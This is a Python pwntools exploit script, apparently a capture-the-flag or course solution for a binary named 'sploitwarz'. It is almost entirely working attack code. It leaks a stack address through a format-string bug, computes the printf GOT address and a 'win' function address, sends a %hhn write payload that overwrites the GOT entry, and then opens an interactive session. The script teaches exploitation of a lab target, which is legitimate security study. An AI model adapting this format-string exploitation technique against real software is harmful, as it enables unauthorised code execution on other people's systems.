from pwn import *

def get_n(new, prev, size):
	while new <= prev:
		new += (1 << size)
	return new-prev

def gen_addrs(base_addr):
	addrs = b''
	for i in range(4):
		addrs += p32(base_addr + i)
	return addrs

def gen_format_writes(to_write, setup_len, stack_offset):
	payload = b''
	n_val = [setup_len]
	for i in range(4):
		n_val += [get_n(to_write[i], sum(n_val[:i+1]), 8)]
		payload += '%{}c'.format(n_val[i+1]).encode()
		payload += '%{}$hhn'.format(stack_offset + i).encode()
	return payload

def gamble(should_return):
	while True:
		p.recvuntil("will you do? ")
		p.sendline('g')
		p.recvuntil('): ')
		p.sendline('0.01')
		p.recvuntil('> ')
		p.sendline('3')
		p.recvline()
		data = p.recv(4).decode()
		if data == 'Well':
			if not should_return:
				break
		data += p.recvline().decode()
		match = re.search(r'0x[\da-f]+', data)
		if match:
			print(data)
			return(match.group())
			break
		else:
			print('f')
			p.send('f')

#p = remote('plsdonthaq.me', 4004)
p = process('./sploitwarz')
#context.terminal = 'qterminal'
#gdb.attach(p, ''' break do_gamble''')

p.sendline(b'{0x%x}')

g_player_addr = int(gamble(True), 16)-0x14 # this address is ebx+0x208
ebx = g_player_addr - 0x208
printf_got_addr = ebx + 0x10 # printf got @ ebx+0x10
# note that ebx contains binary offset 0x3518
# win function is at binary offset 0x0ab4
win_addr = ebx - 0x3518 + 0x0ab4
win_addr = [c for c in p32(win_addr)]

p.send('y')
p.recvuntil("will you do? ")
p.sendline('c')
p.recvuntil("new handle? ")

payload = gen_addrs(printf_got_addr)
setup_len = len(payload)
payload += gen_format_writes(win_addr, setup_len, 5)

p.sendline(payload)
gamble(False)

p.interactive()
